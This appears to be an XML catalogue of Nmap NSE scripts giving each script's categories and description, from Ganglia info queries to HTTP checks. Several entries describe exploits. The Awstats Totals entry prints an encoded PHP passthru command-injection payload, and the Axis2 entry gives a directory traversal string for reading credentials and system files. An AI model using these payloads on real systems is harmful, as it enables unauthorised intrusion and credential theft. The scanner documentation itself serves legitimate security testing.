<description>Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04&#xa;(CVE-2011-2523). This script attempts to exploit the backdoor using the&#xa;innocuous &lt;code&gt;id&lt;/code&gt; command by default, but that can be changed with&#xa;the &lt;code&gt;exploit.cmd&lt;/code&gt; or &lt;code&gt;ftp-vsftpd-backdoor.cmd&lt;/code&gt; script&#xa;arguments.&#xa;&#xa;References:&#xa;&#xa;* http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html&#xa;* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb&#xa;* http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2011-2523&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ftp-vuln-cve2010-4221.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Checks for a stack-based buffer overflow in the ProFTPD server, version&#xa;between 1.3.2rc3 and 1.3.3b. By sending a large number of TELNET_IAC escape&#xa;sequence, the proftpd process miscalculates the buffer length, and a remote&#xa;attacker will be able to corrupt the stack and execute arbitrary code within&#xa;the context of the proftpd process (CVE-2010-4221). Authentication is not&#xa;required to exploit this vulnerability.&#xa;&#xa;Reference:&#xa;* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221&#xa;* http://www.exploit-db.com/exploits/15449/&#xa;* http://www.metasploit.com/modules/exploit/freebsd/ftp/proftp_telnet_iac&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ganglia-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves system information (OS version, available memory, etc.) from&#xa;a listening Ganglia Monitoring Daemon or Ganglia Meta Daemon.&#xa;&#xa;Ganglia is a scalable distributed monitoring system for high-performance&#xa;computing systems such as clusters and Grids. The information retrieved&#xa;includes HDD size, available memory, OS version, architecture (and more) from&#xa;each of the systems in each of the clusters in the grid.&#xa;&#xa;For more information about Ganglia, see:&#xa;* http://ganglia.sourceforge.net/&#xa;* http://en.wikipedia.org/wiki/Ganglia_(software)#Ganglia_Monitoring_Daemon_.28gmond.29&#xa;* http://en.wikipedia.org/wiki/Ganglia_(software)#Ganglia_Meta_Daemon_.28gmetad.29&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\giop-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Queries a CORBA naming server for a list of objects.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\gkrellm-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Queries a GKRellM service for monitoring information. A single round of&#xa;collection is made, showing a snapshot of information at the time of the&#xa;request.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\gopher-ls.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Lists files and directories at the root of a gopher service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\gpsd-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves GPS time, coordinates and speed from the GPSD network daemon.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hadoop-datanode-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Discovers information such as log directories from an Apache Hadoop DataNode&#xa;HTTP status page.&#xa;&#xa;Information gathered:&#xa;* Log directory (relative to http://host:port/)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hadoop-jobtracker-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves information from an Apache Hadoop JobTracker HTTP status page.&#xa;&#xa;Information gathered:&#xa;* State of the JobTracker.&#xa;* Date/time the service was started&#xa;* Hadoop version&#xa;* Hadoop Compile date&#xa;* JobTracker ID&#xa;* Log directory (relative to http://host:port/)&#xa;* Associated TaskTrackers&#xa;* Optionally also user activity history&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hadoop-namenode-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves information from an Apache Hadoop NameNode HTTP status page.&#xa;&#xa;Information gathered:&#xa;* Date/time the service was started&#xa;* Hadoop version&#xa;* Hadoop compile date&#xa;* Upgrades status&#xa;* Filesystem directory (relative to http://host:port/)&#xa;* Log directory (relative to http://host:port/)&#xa;* Associated DataNodes.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hadoop-secondary-namenode-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves information from an Apache Hadoop secondary NameNode HTTP status page.&#xa;&#xa;Information gathered:&#xa;* Date/time the service was started&#xa;* Hadoop version&#xa;* Hadoop compile date&#xa;* Hostname or IP address and port of the master NameNode server&#xa;* Last time a checkpoint was taken&#xa;* How often checkpoints are taken (in seconds)&#xa;* Log directory (relative to http://host:port/)&#xa;* File size of current checkpoint&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hadoop-tasktracker-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves information from an Apache Hadoop TaskTracker HTTP status page.&#xa;&#xa;Information gathered:&#xa;* Hadoop version&#xa;* Hadoop Compile date&#xa;* Log directory (relative to http://host:port/)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hbase-master-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves information from an Apache HBase (Hadoop database) master HTTP status page.&#xa;&#xa;Information gathered:&#xa;* Hbase version&#xa;* Hbase compile date&#xa;* Hbase root directory&#xa;* Hadoop version&#xa;* Hadoop compile date&#xa;* Average load&#xa;* Zookeeper quorum server&#xa;* Associated region servers&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hbase-region-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves information from an Apache HBase (Hadoop database) region server HTTP status page.&#xa;&#xa;Information gathered:&#xa;* HBase version&#xa;* HBase compile date&#xa;* A bunch of metrics about the state of the region server&#xa;* Zookeeper quorum server&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hddtemp-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Reads hard disk information (such as brand, model, and sometimes temperature) from a listening hddtemp service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hnap-info.nse">
<categories><category>safe</category><category>discovery</category><category>default</category><category>version</category></categories>
<description>Retrieve hardwares details and configuration information utilizing HNAP, the &quot;Home Network Administration Protocol&quot;.&#xa;It is an HTTP-Simple Object Access Protocol (SOAP)-based protocol which allows for remote topology discovery,&#xa;configuration, and management of devices (routers, cameras, PCs, NAS, etc.)</description>
</script>
<script filename="E:\Software\Nmap/scripts\hostmap-bfk.nse">
<categories><category>external</category><category>discovery</category></categories>
<description>Discovers hostnames that resolve to the target&apos;s IP address by querying the online database at http://www.bfk.de/bfk_dnslogger.html.&#xa;&#xa;The script is in the &quot;external&quot; category because it sends target IPs to a third party in order to query their database.&#xa;&#xa;This script was formerly (until April 2012) known as hostmap.nse.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hostmap-crtsh.nse">
<categories><category>external</category><category>discovery</category></categories>
<description>Finds subdomains of a web server by querying Google&apos;s Certificate Transparency&#xa;logs database (https://crt.sh).&#xa;&#xa;The script will run against any target that has a name, either specified on the&#xa;command line or obtained via reverse-DNS.&#xa;&#xa;NSE implementation of ctfr.py (https://github.com/UnaPibaGeek/ctfr.git) by Sheila Berta.&#xa;&#xa;References:&#xa;* www.certificate-transparency.org&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\hostmap-robtex.nse">
<categories><category>discovery</category><category>safe</category><category>external</category></categories>
<description>Discovers hostnames that resolve to the target&apos;s IP address by querying the online Robtex service at http://ip.robtex.com/.&#xa;&#xa;*TEMPORARILY DISABLED* due to changes in Robtex&apos;s API. See https://www.robtex.com/api/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-adobe-coldfusion-apsa1301.nse">
<categories><category>exploit</category><category>vuln</category></categories>
<description>Attempts to exploit an authentication bypass vulnerability in Adobe Coldfusion&#xa;servers to retrieve a valid administrator&apos;s session cookie.&#xa;&#xa;Reference:&#xa;* APSA13-01: http://www.adobe.com/support/security/advisories/apsa13-01.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-affiliate-id.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Grabs affiliate network IDs (e.g. Google AdSense or Analytics, Amazon&#xa;Associates, etc.) from a web page. These can be used to identify pages&#xa;with the same owner.&#xa;&#xa;If there is more than one target using an ID, the postrule of this&#xa;script shows the ID along with a list of the targets using it.&#xa;&#xa;Supported IDs:&#xa;* Google Analytics&#xa;* Google AdSense&#xa;* Amazon Associates&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-apache-negotiation.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Checks if the target http server has mod_negotiation enabled.  This&#xa;feature can be leveraged to find hidden resources and spider a web&#xa;site using fewer requests.&#xa;&#xa;The script works by sending requests for resources like index and home&#xa;without specifying the extension. If mod_negotiate is enabled (default&#xa;Apache configuration), the target would reply with content-location header&#xa;containing target resource (such as index.html) and vary header containing&#xa;&quot;negotiate&quot; depending on the configuration.&#xa;&#xa;For more information, see:&#xa;* http://www.wisec.it/sectou.php?id=4698ebdc59d15&#xa;* Metasploit auxiliary module&#xa;    /modules/auxiliary/scanner/http/mod_negotiation_scanner.rb&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-apache-server-status.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to retrieve the server-status page for Apache webservers that&#xa;have mod_status enabled. If the server-status page exists and appears to&#xa;be from mod_status the script will parse useful information such as the&#xa;system uptime, Apache version and recent HTTP requests.&#xa;&#xa;References:&#xa;* http://httpd.apache.org/docs/2.4/mod/mod_status.html&#xa;* https://blog.sucuri.net/2012/10/popular-sites-with-apache-server-status-enabled.html&#xa;* https://www.exploit-db.com/ghdb/1355/&#xa;* https://github.com/michenriksen/nmap-scripts&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-aspnet-debug.nse">
<categories><category>vuln</category><category>discovery</category></categories>
<description>Determines if a ASP.NET application has debugging enabled using a HTTP DEBUG request.&#xa;&#xa;The HTTP DEBUG verb is used within ASP.NET applications to start/stop remote&#xa;debugging sessions. The script sends a &apos;stop-debug&apos; command to determine the&#xa;application&apos;s current configuration state but access to RPC services is required&#xa; to interact with the debugging session. The request does not change the&#xa;application debugging configuration.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-auth-finder.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Spiders a web site to find web pages requiring form-based or HTTP-based authentication. The results are returned in a table with each url and the&#xa;detected method.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-auth.nse">
<categories><category>default</category><category>auth</category><category>safe</category></categories>
<description>Retrieves the authentication scheme and realm of a web service that requires&#xa;authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-avaya-ipoffice-users.nse">
<categories><category>exploit</category><category>vuln</category></categories>
<description>Attempts to enumerate users in Avaya IP Office systems 7.x.&#xa;&#xa;Avaya IP Office systems allow unauthenticated access to the URI &apos;/system/user/scn_user_list&apos;&#xa;which returns a XML file containing user information such as display name, full name and&#xa;extension number.&#xa;&#xa;* Tested on Avaya IP Office 7.0(27).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-awstatstotals-exec.nse">
<categories><category>vuln</category><category>intrusive</category><category>exploit</category></categories>
<description>Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14&#xa;and possibly other products based on it (CVE: 2008-3922).&#xa;&#xa;This vulnerability can be exploited through the GET variable &lt;code&gt;sort&lt;/code&gt;.&#xa;The script queries the web server with the command payload encoded using PHP&apos;s&#xa;chr() function:&#xa;&#xa;&lt;code&gt;?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}&lt;/code&gt;&#xa;&#xa;Common paths for Awstats Total:&#xa;* &lt;code&gt;/awstats/index.php&lt;/code&gt;&#xa;* &lt;code&gt;/awstatstotals/index.php&lt;/code&gt;&#xa;* &lt;code&gt;/awstats/awstatstotals.php&lt;/code&gt;&#xa;&#xa;References:&#xa;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922&#xa;* http://www.exploit-db.com/exploits/17324/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-axis2-dir-traversal.nse">
<categories><category>vuln</category><category>intrusive</category><category>exploit</category></categories>
<description>Exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by&#xa;sending a specially crafted request to the parameter &lt;code&gt;xsd&lt;/code&gt;&#xa;(BID 40343). By default it will try to retrieve the configuration file of the&#xa;Axis2 service &lt;code&gt;&apos;/conf/axis2.xml&apos;&lt;/code&gt; using the path&#xa;&lt;code&gt;&apos;/axis2/services/&apos;&lt;/code&gt; to return the username and password of the&#xa;admin account.&#xa;&#xa;To exploit this vulnerability we need to detect a valid service running on the&#xa;installation so we extract it from &lt;code&gt;/listServices&lt;/code&gt; before exploiting&#xa;the directory traversal vulnerability.  By default it will retrieve the&#xa;configuration file, if you wish to retrieve other files you need to set the&#xa;argument &lt;code&gt;http-axis2-dir-traversal.file&lt;/code&gt; correctly to traverse to&#xa;the file&apos;s directory. Ex. &lt;code&gt;../../../../../../../../../etc/issue&lt;/code&gt;&#xa;&#xa;To check the version of an Apache Axis2 installation go to:&#xa;http://domain/axis2/services/Version/getVersion&#xa;&#xa;Reference:&#xa;* https://www.securityfocus.com/bid/40343&#xa;* https://www.exploit-db.com/exploits/12721/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-backup-finder.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Spiders a website and attempts to identify backup copies of discovered files.&#xa;It does so by requesting a number of different combinations of the filename (eg. index.bak, index.html~, copy of index.html).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-barracuda-dir-traversal.nse">
<categories><category>intrusive</category><category>exploit</category><category>auth</category></categories>
<description>Attempts to retrieve the configuration settings from a Barracuda&#xa;Networks Spam &amp; Virus Firewall device using the directory traversal&#xa;vulnerability described at&#xa;http://seclists.org/fulldisclosure/2010/Oct/119.&#xa;&#xa;This vulnerability is in the &quot;locale&quot; parameter of&#xa;&quot;/cgi-mod/view_help.cgi&quot; or &quot;/cgi-bin/view_help.cgi&quot;, allowing the&#xa;information to be retrieved from a MySQL database dump.  The web&#xa;administration interface runs on port 8000 by default.&#xa;&#xa;Barracuda Networks Spam &amp; Virus Firewall &lt;= 4.1.1.021 Remote Configuration Retrieval&#xa;Original exploit by ShadowHatesYou &lt;Shadow@SquatThis.net&gt;&#xa;For more information, see:&#xa;http://seclists.org/fulldisclosure/2010/Oct/119&#xa;http://www.exploit-db.com/exploits/15130/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-bigip-cookie.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Decodes any unencrypted F5 BIG-IP cookies in the HTTP response.&#xa;BIG-IP cookies contain information on backend systems such as&#xa;internal IP addresses and port numbers.&#xa;See here for more info: https://support.f5.com/csp/article/K6917&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against http basic, digest and ntlm authentication.&#xa;&#xa;This script uses the unpwdb and brute libraries to perform password&#xa;guessing. Any successful guesses are stored in the nmap registry, using&#xa;the creds library, for other scripts to use.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-cakephp-version.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Obtains the CakePHP version of a web application built with the CakePHP&#xa;framework by fingerprinting default files shipped with the CakePHP framework.&#xa;&#xa;This script queries the files &apos;vendors.php&apos;, &apos;cake.generic.css&apos;,&#xa;&apos;cake.icon.png&apos; and &apos;cake.icon.gif&apos; to try to obtain the version of the CakePHP&#xa;installation.&#xa;&#xa;Since installations that had been upgraded are prone to false positives due to&#xa;old files that aren&apos;t removed, the script displays 3 different versions:&#xa;* Codebase: Taken from the existence of vendors.php (1.1.x or 1.2.x if it does and 1.3.x otherwise)&#xa;* Stylesheet: Taken from cake.generic.css&#xa;* Icon: Taken from cake.icon.gif or cake.icon.png&#xa;&#xa;For more information about CakePHP visit: http://www.cakephp.org/.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-chrono.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Measures the time a website takes to deliver a web page and returns&#xa;the maximum, minimum and average time it took to fetch a page.&#xa;&#xa;Web pages that take longer time to load could be abused by attackers in DoS or&#xa;DDoS attacks due to the fact that they are likely to consume more resources on&#xa;the target server. This script could help identifying these web pages.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-cisco-anyconnect.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Connect as Cisco AnyConnect client to a Cisco SSL VPN and retrieves version&#xa;and tunnel information.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-coldfusion-subzero.nse">
<categories><category>exploit</category></categories>
<description>Attempts to retrieve version, absolute path of administration panel and the&#xa;file &apos;password.properties&apos; from vulnerable installations of ColdFusion 9 and&#xa;10.&#xa;&#xa;This was based on the exploit &apos;ColdSub-Zero.pyFusion v2&apos;.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-comments-displayer.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Extracts and outputs HTML and JavaScript comments from HTTP responses.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-config-backup.nse">
<categories><category>auth</category><category>intrusive</category></categories>
<description>Checks for backups and swap files of common content management system&#xa;and web server configuration files.&#xa;&#xa;When web server files are edited in place, the text editor can leave&#xa;backup or swap files in a place where the web server can serve them. The&#xa;script checks for these files:&#xa;&#xa;* &lt;code&gt;wp-config.php&lt;/code&gt;: WordPress&#xa;* &lt;code&gt;config.php&lt;/code&gt;: phpBB, ExpressionEngine&#xa;* &lt;code&gt;configuration.php&lt;/code&gt;: Joomla&#xa;* &lt;code&gt;LocalSettings.php&lt;/code&gt;: MediaWiki&#xa;* &lt;code&gt;/mediawiki/LocalSettings.php&lt;/code&gt;: MediaWiki&#xa;* &lt;code&gt;mt-config.cgi&lt;/code&gt;: Movable Type&#xa;* &lt;code&gt;mt-static/mt-config.cgi&lt;/code&gt;: Movable Type&#xa;* &lt;code&gt;settings.php&lt;/code&gt;: Drupal&#xa;* &lt;code&gt;.htaccess&lt;/code&gt;: Apache&#xa;&#xa;And for each of these file applies the following transformations (using&#xa;&lt;code&gt;config.php&lt;/code&gt; as an example):&#xa;&#xa;* &lt;code&gt;config.bak&lt;/code&gt;: Generic backup.&#xa;* &lt;code&gt;config.php.bak&lt;/code&gt;: Generic backup.&#xa;* &lt;code&gt;config.php~&lt;/code&gt;: Vim, Gedit.&#xa;* &lt;code&gt;#config.php#&lt;/code&gt;: Emacs.&#xa;* &lt;code&gt;config copy.php&lt;/code&gt;: Mac OS copy.&#xa;* &lt;code&gt;Copy of config.php&lt;/code&gt;: Windows copy.&#xa;* &lt;code&gt;config.php.save&lt;/code&gt;: GNU Nano.&#xa;* &lt;code&gt;.config.php.swp&lt;/code&gt;: Vim swap.&#xa;* &lt;code&gt;config.php.swp&lt;/code&gt;: Vim swap.&#xa;* &lt;code&gt;config.php.old&lt;/code&gt;: Generic backup.&#xa;&#xa;This script is inspired by the CMSploit program by Feross Aboukhadijeh:&#xa;http://www.feross.org/cmsploit/.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-cookie-flags.nse">
<categories><category>default</category><category>safe</category><category>vuln</category></categories>
<description>Examines cookies set by HTTP services.  Reports any session cookies set&#xa;without the httponly flag.  Reports any session cookies set over SSL without&#xa;the secure flag.  If http-enum.nse is also run, any interesting paths found&#xa;by it will be checked in addition to the root.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-cors.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Tests an http server for Cross-Origin Resource Sharing (CORS), a way&#xa;for domains to explicitly opt in to having certain methods invoked by&#xa;another domain.&#xa;&#xa;The script works by setting the Access-Control-Request-Method header&#xa;field for certain enumerated methods in OPTIONS requests, and checking&#xa;the responses.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-cross-domain-policy.nse">
<categories><category>safe</category><category>external</category><category>vuln</category></categories>
<description>Checks the cross-domain policy file (/crossdomain.xml) and the client-acces-policy file (/clientaccesspolicy.xml)&#xa;in web applications and lists the trusted domains. Overly permissive settings enable Cross Site Request Forgery&#xa;attacks and may allow attackers to access sensitive data. This script is useful to detect permissive&#xa;configurations and possible domain names available for purchase to exploit the application.&#xa;&#xa;The script queries instantdomainsearch.com to lookup the domains. This functionality is&#xa;turned off by default, to enable it set the script argument http-cross-domain-policy.domain-lookup.&#xa;&#xa;References:&#xa;* http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html&#xa;* http://gursevkalra.blogspot.com/2013/08/bypassing-same-origin-policy-with-flash.html&#xa;* https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html&#xa;* https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/CrossDomain_PolicyFile_Specification.pdf&#xa;* https://www.owasp.org/index.php/Test_RIA_cross_domain_policy_%28OTG-CONFIG-008%29&#xa;* http://acunetix.com/vulnerabilities/web/insecure-clientaccesspolicy-xml-file&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-csrf.nse">
<categories><category>intrusive</category><category>exploit</category><category>vuln</category></categories>
<description>This script detects Cross Site Request Forgeries (CSRF) vulnerabilities.&#xa;&#xa;It will try to detect them by checking each form if it contains an unpredictable&#xa;token for each user. Without one an attacker may forge malicious requests.&#xa;&#xa;To recognize a token in a form, the script will iterate through the form&apos;s&#xa;attributes and will search for common patterns in their names. If that fails, it&#xa;will also calculate the entropy of each attribute&apos;s value. A big entropy means a&#xa;possible token.&#xa;&#xa;A common use case for this script comes along with a cookie that gives access&#xa;in pages that require authentication, because that&apos;s where the privileged&#xa;exist. See the http library&apos;s documentation to set your own cookie.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-date.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Gets the date from HTTP-like services. Also prints how much the date&#xa;differs from local time. Local time is the time the HTTP request was&#xa;sent, so the difference includes at least the duration of one RTT.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-default-accounts.nse">
<categories><category>discovery</category><category>auth</category><category>intrusive</category></categories>
<description>Tests for access with default credentials used by a variety of web applications and devices.&#xa;&#xa;It works similar to http-enum, we detect applications by matching known paths and launching a login routine using default credentials when found.&#xa;This script depends on a fingerprint file containing the target&apos;s information: name, category, location paths, default credentials and login routine.&#xa;&#xa;You may select a category if you wish to reduce the number of requests. We have categories like:&#xa;* &lt;code&gt;web&lt;/code&gt; - Web applications&#xa;* &lt;code&gt;routers&lt;/code&gt; - Routers&#xa;* &lt;code&gt;security&lt;/code&gt; - CCTVs and other security devices&#xa;* &lt;code&gt;industrial&lt;/code&gt; - Industrial systems&#xa;* &lt;code&gt;printer&lt;/code&gt; - Network-attached printers and printer servers&#xa;* &lt;code&gt;storage&lt;/code&gt; - Storage devices&#xa;* &lt;code&gt;virtualization&lt;/code&gt; - Virtualization systems&#xa;* &lt;code&gt;console&lt;/code&gt; - Remote consoles&#xa;&#xa;You can also select a specific fingerprint or a brand, such as BIG-IQ or Siemens. This matching is based on case-insensitive words. This means that &quot;nas&quot; will select Seagate BlackArmor NAS storage but not Netgear ReadyNAS.&#xa;&#xa;For a fingerprint to be used it needs to satisfy both the category and name criteria.&#xa;&#xa;By default, the script produces output only when default credentials are found, while staying silent when the target only matches some fingerprints (but no credentials are found). With increased verbosity (option -v), the script will also report all matching fingerprints.&#xa;&#xa;Please help improve this script by adding new entries to nselib/data/http-default-accounts.lua&#xa;&#xa;Remember each fingerprint must have:&#xa;* &lt;code&gt;name&lt;/code&gt; - Descriptive name&#xa;* &lt;code&gt;category&lt;/code&gt; - Category&#xa;* &lt;code&gt;login_combos&lt;/code&gt; - Table of login combinations&#xa;* &lt;code&gt;paths&lt;/code&gt; - Table containing possible path locations of the target&#xa;* &lt;code&gt;login_check&lt;/code&gt; - Login function of the target&#xa;&#xa;In addition, a fingerprint should have:&#xa;* &lt;code&gt;target_check&lt;/code&gt; - Target validation function. If defined, it will be called to validate the target before attempting any logins.&#xa;* &lt;code&gt;cpe&lt;/code&gt; - Official CPE Dictionary entry (see https://nvd.nist.gov/cpe.cfm)&#xa;&#xa;Default fingerprint file: /nselib/data/http-default-accounts-fingerprints.lua&#xa;This script was based on http-enum.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-devframework.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>&#xa;Tries to find out the technology behind the target website.&#xa;&#xa;The script checks for certain defaults that might not have been changed, like&#xa;common headers or URLs or HTML content.&#xa;&#xa;While the script does some guessing, note that overall there&apos;s no way to&#xa;determine what technologies a given site is using.&#xa;&#xa;You can help improve this script by adding new entries to&#xa;nselib/data/http-devframework-fingerprints.lua&#xa;&#xa;Each entry must have:&#xa;* &lt;code&gt;rapidDetect&lt;/code&gt; - Callback function that is called in the beginning&#xa;of detection process. It takes the host and port of target website as arguments.&#xa;* &lt;code&gt;consumingDetect&lt;/code&gt; - Callback function that is called for each&#xa;spidered page. It takes the body of the response (HTML code) and the requested&#xa;path as arguments.&#xa;&#xa;Note that the &lt;code&gt;consumingDetect&lt;/code&gt; callback will not take place only if&#xa;&lt;code&gt;rapid&lt;/code&gt; option is enabled.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-dlink-backdoor.nse">
<categories><category>exploit</category><category>vuln</category></categories>
<description>Detects a firmware backdoor on some D-Link routers by changing the User-Agent&#xa;to a &quot;secret&quot; value. Using the &quot;secret&quot; User-Agent bypasses authentication&#xa;and allows admin access to the router.&#xa;&#xa;The following router models are likely to be vulnerable: DIR-100, DIR-120,&#xa;DI-624S, DI-524UP, DI-604S, DI-604UP, DI-604+, TM-G5240&#xa;&#xa;In addition, several Planex routers also appear to use the same firmware:&#xa;BRL-04UR, BRL-04CW&#xa;&#xa;Reference: http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-dombased-xss.nse">
<categories><category>intrusive</category><category>exploit</category><category>vuln</category></categories>
<description>It looks for places where attacker-controlled information in the DOM may be used&#xa;to affect JavaScript execution in certain ways. The attack is explained here:&#xa;http://www.webappsec.org/projects/articles/071105.shtml&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-domino-enum-passwords.nse">
<categories><category>intrusive</category><category>auth</category></categories>
<description>Attempts to enumerate the hashed Domino Internet Passwords that are (by&#xa;default) accessible by all authenticated users. This script can also download&#xa;any Domino ID Files attached to the Person document.  Passwords are presented&#xa;in a form suitable for running in John the Ripper.&#xa;&#xa;The passwords may be stored in two forms (http://comments.gmane.org/gmane.comp.security.openwall.john.user/785):&#xa;&#xa;1. Saltless (legacy support?)&#xa;   Example: 355E98E7C7B59BD810ED845AD0FD2FC4&#xa;   John&apos;s format name: lotus5&#xa;2. Salted (also known as &quot;More Secure Internet Password&quot;)&#xa;   Example: (GKjXibCW2Ml6juyQHUoP)&#xa;   John&apos;s format name: dominosec&#xa;&#xa;It appears as if form based authentication is enabled, basic authentication&#xa;still works. Therefore the script should work in both scenarios. Valid&#xa;credentials can either be supplied directly using the parameters username&#xa;and password or indirectly from results of http-brute or http-form-brute.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-drupal-enum-users.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Enumerates Drupal users by exploiting an information disclosure vulnerability&#xa;in Views, Drupal&apos;s most popular module.&#xa;&#xa;Requests to admin/views/ajax/autocomplete/user/STRING return all usernames that&#xa;begin with STRING. The script works by iterating STRING over letters to extract&#xa;all usernames.&#xa;&#xa;For more information,see:&#xa;* http://www.madirish.net/node/465&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-drupal-enum.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Enumerates the installed Drupal modules/themes by using a list of known modules and themes.&#xa;&#xa;The script works by iterating over module/theme names and requesting&#xa;MODULE_PATH/MODULE_NAME/LICENSE.txt for modules and THEME_PATH/THEME_NAME/LICENSE.txt.&#xa;MODULE_PATH/THEME_PATH which is either provided by the user, grepped for in the html body&#xa;or defaulting to sites/all/modules/.&#xa;&#xa;If the response status code is 200, it means that the module/theme is installed. By&#xa;default, the script checks for the top 100 modules/themes (by downloads), given the&#xa;huge number of existing modules (~18k) and themes(~1.4k).&#xa;&#xa;If you want to update your themes or module list refer to the link below.&#xa;&#xa;* https://svn.nmap.org/nmap-exp/gyani/misc/drupal-update.py&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-enum.nse">
<categories><category>discovery</category><category>intrusive</category><category>vuln</category></categories>
